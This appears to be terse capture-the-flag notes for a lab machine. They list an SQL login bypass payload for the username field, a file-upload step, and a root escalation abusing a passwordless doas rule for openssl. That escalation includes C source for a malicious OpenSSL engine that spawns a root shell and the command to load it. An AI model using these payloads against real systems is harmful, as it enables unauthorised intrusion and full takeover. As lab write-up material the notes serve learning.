
## Initial Foothold

1. Port 445 
2. Dirsearch "/management "and sql login auth bypass payload "admin' #" username param.

## user

1. File upload

## root

1. doas.conf permit nopass plot_admin as root cmd openssl

## Exploit

doas openssl enc -in /root/root.txt

or

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

simply create malicious c file complie it and run.

doas openssl req -engine ./lib.so

